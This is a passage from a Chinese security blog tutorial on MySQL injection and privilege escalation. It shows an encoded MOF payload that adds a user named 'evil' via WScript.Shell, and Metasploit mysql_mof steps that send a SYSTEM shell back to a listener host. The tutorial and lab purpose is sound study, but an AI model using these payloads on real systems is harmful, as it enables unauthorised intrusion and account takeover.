32, 65, 99, 116, 105, 118, 101, 83, 99, 114, 105, 112, 116, 69, 118, 101, 110, 116, 67, 111, 110, 115, 117, 109, 101, 114, 32, 97, 115, 32, 36, 67, 111, 110, 115, 117, 109, 101, 114, 13, 10, 123, 13, 10, 78, 97, 109, 101, 32, 61, 32, 34, 99, 111, 110, 115, 80, 67, 83, 86, 50, 34, 59, 13, 10, 83, 99, 114, 105, 112, 116, 105, 110, 103, 69, 110, 103, 105, 110, 101, 32, 61, 32, 34, 74, 83, 99, 114, 105, 112, 116, 34, 59, 13, 10, 83, 99, 114, 105, 112, 116, 84, 101, 120, 116, 32, 61, 13, 10, 34, 118, 97, 114, 32, 87, 83, 72, 32, 61, 32, 110, 101, 119, 32, 65, 99, 116, 105, 118, 101, 88, 79, 98, 106, 101, 99, 116, 40, 92, 34, 87, 83, 99, 114, 105, 112, 116, 46, 83, 104, 101, 108, 108, 92, 34, 41, 92, 110, 87, 83, 72, 46, 114, 117, 110, 40, 92, 34, 110, 101, 116, 46, 101, 120, 101, 32, 117, 115, 101, 114, 32, 101, 118, 105, 108, 32, 65, 98, 99, 100, 49, 50, 51, 52, 32, 47, 97, 100, 100, 92, 34, 41, 34, 59, 13, 10, 125, 59, 13, 10, 105, 110, 115, 116, 97, 110, 99, 101, 32, 111, 102, 32, 95, 95, 70, 105, 108, 116, 101, 114, 84, 111, 67, 111, 110, 115, 117, 109, 101, 114, 66, 105, 110, 100, 105, 110, 103, 13, 10, 123, 13, 10, 67, 111, 110, 115, 117, 109, 101, 114, 32, 61, 32, 36, 67, 111, 110, 115, 117, 109, 101, 114, 59, 13, 10, 70, 105, 108, 116, 101, 114, 32, 61, 32, 36, 69, 118, 101, 110, 116, 70, 105, 108, 116, 101, 114, 59, 13, 10, 125, 59) into dumpfile &#x27;C:\\WINDOWS\\system32\\wbem\\mof\\user.mof&#x27;;</span><br></pre></td></tr></table></figure>
<h4 id="利用MSF自动化提权"><a href="#利用MSF自动化提权" class="headerlink" title="利用MSF自动化提权"></a>利用MSF自动化提权</h4><p>可以利用<code>msf</code>的<code>exploit/windows/mysql/mysql_mof</code>模块进行自动化提权，命令如下</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">use exploit/windows/mysql/mysql_mof</span><br><span class="line"><span class="meta">#</span><span class="bash"> mysql账号密码</span></span><br><span class="line">set username root</span><br><span class="line">set password root</span><br><span class="line"><span class="meta">#</span><span class="bash"> 目标主机ip和端口</span></span><br><span class="line">set rhost 192.168.26.174</span><br><span class="line">set rport 3306</span><br><span class="line"><span class="meta">#</span><span class="bash"> 接收shell的ip和端口</span></span><br><span class="line">set lhost 192.168.26.129</span><br><span class="line">set lport 4444</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
<p>返回的是system权限</p>
<p><img src="/img/gif/loading4.gif" data-original="https://i.loli.net/2021/10/05/Cxykrgh2HWib3qQ.png" alt="img"></p>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">Ulysses</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://plumeria.ltd/post/c2f49bfa.html">https://plumeria.ltd/post/c2f49bfa.html</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://plumeria.ltd" target="_blank">Ulysses'Blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/SQL%E6%B3%A8%E5%85%A5/">SQL注入</a></div><div class="post_share"><div class="social-share" data-image="/img/cover/mysql.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/post/d3a798c0.html"><img class="prev-cover" src="/img/gif/loading4.gif" data-original="/img/cover/access.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">Access数据库注入攻击方式</div></div></a></div><div class="next-post pull-right"><a href="/post/724e6336.html"><img class="next-cover" src="/img/gif/loading4.gif" data-original="/img/cover/sql.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">SQL注入分类</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/post/1f3ac757.html" title="SQL注入的原理"><img class="cover" src="/img/gif/loading4.gif" data-original="/img/cover/sql.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-10-06</div><div class="title">SQL注入的原理</div></div></a></div><div><a href="/post/724e6336.html" title="SQL注入分类"><img class="cover" src="/img/gif/loading4.gif" data-original="/img/cover/sql.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-10-06</div><div class="title">SQL注入分类</div></div></a></div><div><a href="/post/d3a798c0.html" title="Access数据库注入攻击方式"><img class="cover" src="/img/gif/loading4.gif" data-original="/img/cover/access.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-10-06</div><div class="title">Access数据库注入攻击方式</div></div></a></div><div><a href="/post/ec74cb90.html" title="Oracle数据库注入攻击方式"><img class="cover" src="/img/gif/loading4.gif" data-original="/img/cover/oracle.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-10-06</div><div class="title">Oracle数据库注入攻击方式</div></div></a></div><div><a href="/post/6daae3c4.html" title="SQLServer数据库注入攻击方式"><img class="cover" src="/img/gif/loading4.gif" data-original="/img/cover/mssql.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-10-06</div><div class="title">SQLServer数据库注入攻击方式</div></div></a></div><div><a href="/post/1853c6b8.html" title="PostgreSQL数据库注入攻击方式"><img class="cover" src="/img/gif/loading4.gif" data-original="/img/cover/pgsql.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-10-11</div><div class="title">PostgreSQL数据库注入攻击方式</div></div></a></div></div></div><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div class="vcomment" id="vcomment"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/gif/loading4.gif" data-original="https://avatars.githubusercontent.com/u/63300491?v=4" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">Ulysses</div><div class="author-info__description"></div></div><div class="card-info-data"><div class="card-info-data-item is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">30</div></a></div><div class="card-info-data-item is-center"><a href="/tags/"><div class="headline">标签</div><div class="length-num">7</div></a></div><div class="card-info-data-item is-center"><a href="/categories/"><div class="headline">分类</div><div class="length-num">4</div></a></div></div><a class="button--animated" id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/UlyssesTakusen"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn card-announcement-animation"></i><span>公告</span></div><div class="announcement_content">记录学习与生活~</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#MySQL%E6%95%B0%E6%8D%AE%E5%BA%93%E5%9F%BA%E6%9C%AC%E7%9F%A5%E8%AF%86"><span class="toc-number">1.</span> <span class="toc-text">MySQL数据库基本知识</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#MySQL%E6%95%B0%E6%8D%AE%E5%BA%93%E4%BB%8B%E7%BB%8D"><span class="toc-number">1.1.</span> <span class="toc-text">MySQL数据库介绍</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81%E7%9A%84SQL%E8%AF%AD%E5%8F%A5"><span class="toc-number">1.2.</span> <span class="toc-text">常见的SQL语句</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#MySQL%E7%9B%B8%E5%85%B3%E5%87%BD%E6%95%B0%E4%B8%8E%E5%B8%B8%E9%87%8F"><span class="toc-number">1.3.</span> <span class="toc-text">MySQL相关函数与常量</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#information-schema%E6%95%B0%E6%8D%AE%E5%BA%93"><span class="toc-number">1.4.</span> <span class="toc-text">information_schema数据库</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2%E6%B3%A8%E5%85%A5"><span class="toc-number">2.</span> <span class="toc-text">联合查询注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A4%E6%96%AD%E6%B3%A8%E5%85%A5%E7%82%B9"><span class="toc-number">2.1.</span> <span class="toc-text">判断注入点</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A4%E6%96%AD%E6%98%AF%E9%97%AD%E5%90%88%E7%B1%BB%E5%9E%8B"><span class="toc-number">2.2.</span> <span class="toc-text">判断是闭合类型</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A4%E6%96%AD%E6%9F%A5%E8%AF%A2%E5%88%97%E6%95%B0"><span class="toc-number">2.3.</span> <span class="toc-text">判断查询列数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A4%E6%96%AD%E5%9B%9E%E6%98%BE%E4%BD%8D"><span class="toc-number">2.4.</span> <span class="toc-text">判断回显位</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E6%95%B0%E6%8D%AE%E5%BA%93%E5%90%8D"><span class="toc-number">2.5.</span> <span class="toc-text">获取数据库名</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E8%A1%A8%E5%90%8D"><span class="toc-number">2.6.</span> <span class="toc-text">获取表名</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E5%AD%97%E6%AE%B5%E5%90%8D"><span class="toc-number">2.7.</span> <span class="toc-text">获取字段名</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E6%95%B0%E6%8D%AE"><span class="toc-number">2.8.</span> <span class="toc-text">获取数据</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A0%86%E5%8F%A0%E6%9F%A5%E8%AF%A2%E6%B3%A8%E5%85%A5"><span class="toc-number">3.</span> <span class="toc-text">堆叠查询注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86"><span class="toc-number">3.1.</span> <span class="toc-text">堆叠注入原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5%E7%9A%84%E5%B1%80%E9%99%90%E6%80%A7"><span class="toc-number">3.2.</span> <span class="toc-text">堆叠注入的局限性</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0"><span class="toc-number">3.3.</span> <span class="toc-text">堆叠注入靶场复现</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#sqli-labs-less-39"><span class="toc-number">3.3.1.</span> <span class="toc-text">sqli-labs less-39</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#sqli-labs-less-42"><span class="toc-number">3.3.2.</span> <span class="toc-text">sqli-labs less-42</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9F%BA%E4%BA%8E%E5%87%BD%E6%95%B0%E6%8A%A5%E9%94%99%E7%9A%84%E6%B3%A8%E5%85%A5"><span class="toc-number">4.</span> <span class="toc-text">基于函数报错的注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#XPath%E8%AF%AD%E6%B3%95%E9%94%99%E8%AF%AF"><span class="toc-number">4.1.</span> <span class="toc-text">XPath语法错误</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#extractvalue-%E5%87%BD%E6%95%B0"><span class="toc-number">4.1.1.</span> <span class="toc-text">extractvalue()函数</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#updatexml-%E5%87%BD%E6%95%B0"><span class="toc-number">4.1.2.</span> <span class="toc-text">updatexml()函数</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%BB%E9%94%AE%E9%87%8D%E5%A4%8D%E9%94%99%E8%AF%AF"><span class="toc-number">4.2.</span> <span class="toc-text">主键重复错误</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9F%BA%E4%BA%8E%E5%B8%83%E5%B0%94%E8%BF%90%E7%AE%97%E7%9A%84%E7%9B%B2%E6%B3%A8"><span class="toc-number">5.</span> <span class="toc-text">基于布尔运算的盲注</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B5%8B%E8%AF%95%E6%AD%A3%E5%B8%B8%E5%9B%9E%E6%98%BE%E4%B8%8E%E9%94%99%E8%AF%AF%E5%9B%9E%E6%98%BE"><span class="toc-number">5.1.</span> <span class="toc-text">测试正常回显与错误回显</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%8C%9C%E8%A7%A3%E6%95%B0%E6%8D%AE%E5%BA%93%E5%90%8D"><span class="toc-number">5.2.</span> <span class="toc-text">猜解数据库名</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%8C%9C%E8%A7%A3%E8%A1%A8%E5%90%8D"><span class="toc-number">5.3.</span> <span class="toc-text">猜解表名</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%8C%9C%E8%A7%A3%E5%AD%97%E6%AE%B5%E5%90%8D"><span class="toc-number">5.4.</span> <span class="toc-text">猜解字段名</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%8C%9C%E8%A7%A3%E6%95%B0%E6%8D%AE"><span class="toc-number">5.5.</span> <span class="toc-text">猜解数据</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9F%BA%E4%BA%8E%E6%97%B6%E9%97%B4%E7%9A%84%E7%9B%B2%E6%B3%A8"><span class="toc-number">6.</span> <span class="toc-text">基于时间的盲注</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B5%8B%E8%AF%95%E8%83%BD%E5%90%A6%E4%BD%BF%E7%94%A8%E5%BB%B6%E6%97%B6%E7%9B%B2%E6%B3%A8"><span class="toc-number">6.1.</span> <span class="toc-text">测试能否使用延时盲注</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%8C%9C%E8%A7%A3%E6%95%B0%E6%8D%AE%E5%BA%93%E5%90%8D-1"><span class="toc-number">6.2.</span> <span class="toc-text">猜解数据库名</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%8C%9C%E8%A7%A3%E8%A1%A8%E5%90%8D-1"><span class="toc-number">6.3.</span> <span class="toc-text">猜解表名</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%8C%9C%E8%A7%A3%E5%AD%97%E6%AE%B5%E5%90%8D-1"><span class="toc-number">6.4.</span> <span class="toc-text">猜解字段名</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%8C%9C%E8%A7%A3%E6%95%B0%E6%8D%AE-1"><span class="toc-number">6.5.</span> <span class="toc-text">猜解数据</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#BENCHMARK-%E5%87%BD%E6%95%B0"><span class="toc-number">6.6.</span> <span class="toc-text">BENCHMARK()函数</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#DNS%E5%B8%A6%E5%A4%96%E9%80%9A%E4%BF%A1%E6%B3%A8%E5%85%A5"><span class="toc-number">7.</span> <span class="toc-text">DNS带外通信注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AF%E5%B8%A6%E5%A4%96%E9%80%9A%E9%81%93%E6%8A%80%E6%9C%AF"><span class="toc-number">7.1.</span> <span class="toc-text">什么是带外通道技术</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#OOB%E5%88%A9%E7%94%A8%E5%8E%9F%E7%90%86"><span class="toc-number">7.2.</span> <span class="toc-text">OOB利用原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#DNS%E5%B8%A6%E5%A4%96%E6%B3%A8%E5%85%A5%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0"><span class="toc-number">7.3.</span> <span class="toc-text">DNS带外注入靶场复现</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%9E%E9%AA%8C%E6%8F%90%E5%87%86%E5%A4%87%E2%80%94%E2%80%94DNSLog"><span class="toc-number">7.3.1.</span> <span class="toc-text">实验提准备——DNSLog</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%9E%E9%AA%8C%E5%89%8D%E5%87%86%E5%A4%87%E2%80%94%E2%80%94load-file"><span class="toc-number">7.3.2.</span> <span class="toc-text">实验前准备——load_file()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E6%95%B0%E6%8D%AE%E5%BA%93%E5%90%8D-1"><span class="toc-number">7.3.3.</span> <span class="toc-text">获取数据库名</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E8%A1%A8%E5%90%8D-1"><span class="toc-number">7.3.4.</span> <span class="toc-text">获取表名</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E5%AD%97%E6%AE%B5%E5%90%8D-1"><span class="toc-number">7.3.5.</span> <span class="toc-text">获取字段名</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E6%95%B0%E6%8D%AE-1"><span class="toc-number">7.3.6.</span> <span class="toc-text">获取数据</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9F%BA%E4%BA%8E%E5%AD%97%E7%AC%A6%E9%9B%86%E7%9A%84%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5"><span class="toc-number">8.</span> <span class="toc-text">基于字符集的宽字节注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5%E4%BB%8B%E7%BB%8D%E4%B8%8E%E5%8E%9F%E7%90%86"><span class="toc-number">8.1.</span> <span class="toc-text">宽字节注入介绍与原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0"><span class="toc-number">8.2.</span> <span class="toc-text">宽字节注入靶场复现</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%B6%85%E9%95%BF%E5%AD%97%E7%AC%A6%E6%88%AA%E6%96%AD%E6%B3%A8%E5%85%A5"><span class="toc-number">9.</span> <span class="toc-text">超长字符截断注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%B6%85%E9%95%BF%E5%AD%97%E7%AC%A6%E6%88%AA%E6%96%AD%E5%8E%9F%E7%90%86"><span class="toc-number">9.1.</span> <span class="toc-text">超长字符截断原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%B6%85%E9%95%BF%E5%AD%97%E7%AC%A6%E6%88%AA%E6%96%AD%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0"><span class="toc-number">9.2.</span> <span class="toc-text">超长字符截断靶场复现</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5"><span class="toc-number">10.</span> <span class="toc-text">二次注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86"><span class="toc-number">10.1.</span> <span class="toc-text">二次注入原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0"><span class="toc-number">10.2.</span> <span class="toc-text">二次注入靶场复现</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8SQL%E6%B3%A8%E5%85%A5%E5%86%99WebShell"><span class="toc-number">11.</span> <span class="toc-text">利用SQL注入写WebShell</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8Union-Select%E5%86%99%E5%85%A5"><span class="toc-number">11.1.</span> <span class="toc-text">利用Union Select写入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E5%88%86%E9%9A%94%E7%AC%A6%E5%86%99%E5%85%A5"><span class="toc-number">11.2.</span> <span class="toc-text">利用分隔符写入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8Log%E5%86%99%E5%85%A5"><span class="toc-number">11.3.</span> <span class="toc-text">利用Log写入</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#UDF%E6%8F%90%E6%9D%83%E6%89%A7%E8%A1%8C%E7%B3%BB%E7%BB%9F%E5%91%BD%E4%BB%A4"><span class="toc-number">12.</span> <span class="toc-text">UDF提权执行系统命令</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%8A%E4%BC%A0udf%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5%E5%BA%93"><span class="toc-number">12.1.</span> <span class="toc-text">上传udf动态链接库</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BC%95%E7%94%A8%E5%85%B1%E4%BA%AB%E5%BA%93%E6%96%87%E4%BB%B6%E5%88%9B%E5%BB%BA%E5%AD%98%E5%82%A8%E5%87%BD%E6%95%B0"><span class="toc-number">12.2.</span> <span class="toc-text">引用共享库文件创建存储函数</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#MOF%E6%8F%90%E6%9D%83%E6%89%A7%E8%A1%8C%E7%B3%BB%E7%BB%9F%E5%91%BD%E4%BB%A4"><span class="toc-number">13.</span> <span class="toc-text">MOF提权执行系统命令</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%9E%E9%AA%8C%E5%89%8D%E5%87%86%E5%A4%87"><span class="toc-number">13.1.</span> <span class="toc-text">实验前准备</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%89WebShell%E6%8F%90%E6%9D%83"><span class="toc-number">13.2.</span> <span class="toc-text">有WebShell提权</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%97%A0WebShell%E6%8F%90%E6%9D%83"><span class="toc-number">13.3.</span> <span class="toc-text">无WebShell提权</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#16%E8%BF%9B%E5%88%B6%E5%86%99%E5%85%A5"><span class="toc-number">13.3.1.</span> <span class="toc-text">16进制写入</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#ASCII%E5%86%99%E5%85%A5"><span class="toc-number">13.3.2.</span> <span class="toc-text">ASCII写入</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A9%E7%94%A8MSF%E8%87%AA%E5%8A%A8%E5%8C%96%E6%8F%90%E6%9D%83"><span class="toc-number">13.3.3.</span> <span class="toc-text">利用MSF自动化提权</span></a></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/post/30ff95f0.html" title="WAF-Bypass之SQL注入绕过宝塔"><img src="/img/gif/loading4.gif" data-original="/img/cover/bt.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="WAF-Bypass之SQL注入绕过宝塔"/></a><div class="content"><a class="title" href="/post/30ff95f0.html" title="WAF-Bypass之SQL注入绕过宝塔">WAF-Bypass之SQL注入绕过宝塔</a><time datetime="2021-10-27T12:30:00.000Z" title="发表于 2021-10-27 20:30:00">2021-10-27</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/post/f020bf7f.html" title="WAF-Bypass之SQL注入绕过D盾"><img src="/img/gif/loading4.gif" data-original="/img/cover/ddun.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="WAF-Bypass之SQL注入绕过D盾"/></a><div class="content"><a class="title" href="/post/f020bf7f.html" title="WAF-Bypass之SQL注入绕过D盾">WAF-Bypass之SQL注入绕过D盾</a><time datetime="2021-10-25T08:38:19.000Z" title="发表于 2021-10-25 16:38:19">2021-10-25</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/post/e2e31796.html" title="WAF-Bypass之SQL注入绕过云锁"><img src="/img/gif/loading4.gif" data-original="/img/cover/yunsuo.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="WAF-Bypass之SQL注入绕过云锁"/></a><div class="content"><a class="title" href="/post/e2e31796.html" title="WAF-Bypass之SQL注入绕过云锁">WAF-Bypass之SQL注入绕过云锁</a><time datetime="2021-10-23T15:23:19.000Z" title="发表于 2021-10-23 23:23:19">2021-10-23</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/post/6c2dcc62.html" title="WAF-Bypass之SQL注入绕过安全狗"><img src="/img/gif/loading4.gif" data-original="/img/cover/safedog.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="WAF-Bypass之SQL注入绕过安全狗"/></a><div class="content"><a class="title" href="/post/6c2dcc62.html" title="WAF-Bypass之SQL注入绕过安全狗">WAF-Bypass之SQL注入绕过安全狗</a><time datetime="2021-10-16T07:23:19.000Z" title="发表于 2021-10-16 15:23:19">2021-10-16</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/post/e1e1fb64.html" title="WAF-Bypass之WAF介绍与分析"><img src="/img/gif/loading4.gif" data-original="/img/cover/waf.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="WAF-Bypass之WAF介绍与分析"/></a><div class="content"><a class="title" href="/post/e1e1fb64.html" title="WAF-Bypass之WAF介绍与分析">WAF-Bypass之WAF介绍与分析</a><time datetime="2021-10-14T04:43:39.000Z" title="发表于 2021-10-14 12:43:39">2021-10-14</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2021 By Ulysses</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div id="algolia-search"><div class="search-dialog"><div class="search-dialog__title" id="algolia-search-title">Algolia</div><div id="algolia-input-panel"><div id="algolia-search-input"></div></div><hr/><div id="algolia-search-results"><div id="algolia-hits"></div><div id="algolia-pagination"></div><div id="algolia-stats"></div></div><span class="search-close-button"><i class="fas fa-times"></i></span></div><div id="search-mask"></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/search/algolia.js"></script><script>var preloader = {
  endLoading: () => {
    document.body.style.overflow = 'auto';
    document.getElementById('loading-box').classList.add("loaded")
  },
  initLoading: () => {
    document.body.style.overflow = '';
